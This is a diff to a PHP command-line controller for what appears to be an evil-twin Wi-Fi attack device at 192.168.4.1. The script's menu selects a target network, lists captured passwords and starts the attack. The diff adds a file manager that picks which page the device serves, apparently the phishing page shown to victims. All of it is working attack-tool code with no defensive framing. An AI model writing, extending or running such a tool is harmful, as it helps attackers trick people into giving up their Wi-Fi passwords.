@@ -58,7 +58,7 @@ $tmenu= get('http://192.168.4.1/setup');
 $targe = explode('/survey>', $tmenu);
 $targe = explode('</a>', $targe[1]);
 $target = $targe[0];
-print "TARGET: [$target]\n\nMENU:\n[1] SELECT TARGET\n[2] MODE SETTINGS\n[3] LIST PASSWORDS\n[4] STATUS\n[5] REBOOT\n[6] RESET\n[7] START\n\n[>]Select: ";
+print "TARGET: [$target]\n\nMENU:\n[1] SELECT TARGET\n[2] MODE SETTINGS\n[3] FILE MANAGER\n[4] LIST PASSWORDS\n[5] STATUS\n[6] REBOOT\n[7] RESET\n[8] START\n\n[>]Select: ";
 $menu = trim(fgets(STDIN));
 if($menu == 1){
   goto select;
@@ -67,20 +67,23 @@ if($menu == 2){
   goto option;
 }
 if($menu == 3){
-  goto pass;
+  goto fm;
 }
 if($menu == 4){
-  goto status;
+  goto pass;
 }
 if($menu == 5){
+  goto status;
+}
+if($menu == 6){
 $rebot = get('http://192.168.4.1/reboot');
   goto menu;
 }
-if($menu == 6){
+if($menu == 7){
   $reset = get('http://192.168.4.1/reset');
   goto menu;
 }
-if($menu ==  7){
+if($menu ==  8){
   print "[*] TARGET: $target\n";
   print '["PLEASE TURN OFF YOU WIFI TO START ATTACK & BACK AGAIN"]';
   sleep("15");
@@ -129,6 +132,38 @@ $set = $bom[$selet];
 $gas = get("http://192.168.4.1/settarget?$set");
 $save = fopen('ssid.txt', "w");
     fputs($save, "");
+    fclose($save);
+goto menu;
+fm:
+system("clear");
+print $bar;
+print "[*] File\n\n";
+$save = fopen('fm.txt', "a");
+    fputs($save, "\n");
+    fclose($save);
+for($a=1; $a<5; $a++){
+$fm = get("http://192.168.4.1/fm");
+$fil = explode('href=http://192.168.4.1/', $fm);
+$fil = explode('>', $fil[$a]);
+  $f = $fil[0];
+if($f == ""){
+     
+   }else{
+     print "[$a] $f\n";
+     $save = fopen('fm.txt', "a");
+    fputs($save, "$f\n");
+    fclose($save);
+   }
+}
+$file2 = file_get_contents("fm.txt");
+$bom2 = explode("\n",$file2);
+print "\n\n[>]Select: ";
+$fmi = trim(fgets(STDIN));
+$fmh = $bom2[$fmi];
+print $fmh;
+$setfw = get("http://192.168.4.1/fm?action=setpage&file=/$fmh");
+$save = fopen('fm.txt', "w");
+    fputs($save, "\n");
     fclose($save);
 goto menu;
 option:
